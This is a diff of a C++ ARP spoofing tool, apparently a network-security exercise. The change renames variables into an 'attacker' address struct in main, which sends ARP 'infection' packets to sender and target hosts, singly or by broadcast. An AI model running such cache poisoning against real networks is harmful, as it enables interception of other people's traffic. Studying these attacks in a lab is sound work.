@@ -18,13 +18,6 @@
 
 #define MAC_ADDR_LEN 6
 
-// #pragma pack(push, 1)
-// struct EthArpPacket final
-// {
-//         EthHdr eth_;
-//         ArpHdr arp_;
-// };
-// #pragma pack(pop)
 #pragma pack(push, 1)
 struct DeviceAddress
 {
@@ -96,18 +89,14 @@ int main(int argc, char *argv[])
                 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                 return -1;
         }
-
-        // atk
-        Mac my_mac = Mac::getMyMac(dev);
-        std::cout << "MyMac: " << static_cast<std::string>(my_mac) << "\n";
-        Ip my_ip = myIp(dev);
-
-        DeviceAddress sender, target;
-
+        DeviceAddress attacker, sender, target;
+        attacker.ip = myIp(dev);
+        attacker.mac = Mac::getMyMac(dev);
+        
         if (argc == 3)
         { // broadcat 모드
                 target.ip = Ip(argv[2]);
-                EthArpPacket broadcast_arp_packet = Broadcast_Infection(dev, my_mac, target.ip);
+                EthArpPacket broadcast_arp_packet = Broadcast_Infection(dev, attacker.mac, target.ip);
                 SendInfectionPacket(handle, broadcast_arp_packet);
         }
         else
@@ -121,17 +110,17 @@ int main(int argc, char *argv[])
                 {
                         
                         sender.ip = Ip(argv[i]);
-                        EthArpPacket arp_packet = normal_packet(dev, my_mac, sender.ip, my_ip);
+                        EthArpPacket arp_packet = normal_packet(dev, attacker.mac, sender.ip, attacker.ip);
                         sender.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
                         // std::string sender_ip = argv[i];
                         std::string target_ip = argv[i + 1];
 
                         // target
                         target.ip = Ip(argv[i + 1]);
-                        EthArpPacket arp_packet2 = normal_packet(dev, my_mac, target.ip, my_ip);
+                        EthArpPacket arp_packet2 = normal_packet(dev, attacker.mac, target.ip, attacker.ip);
                         target.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet2), sizeof(EthArpPacket));
 
-                        EthArpPacket injection_packet = One_Infection(dev, my_mac, sender.mac, sender.ip, target.ip);
+                        EthArpPacket injection_packet = One_Infection(dev, attacker.mac, sender.mac, sender.ip, target.ip);
                         SendInfectionPacket(handle, injection_packet);
                 }
         }
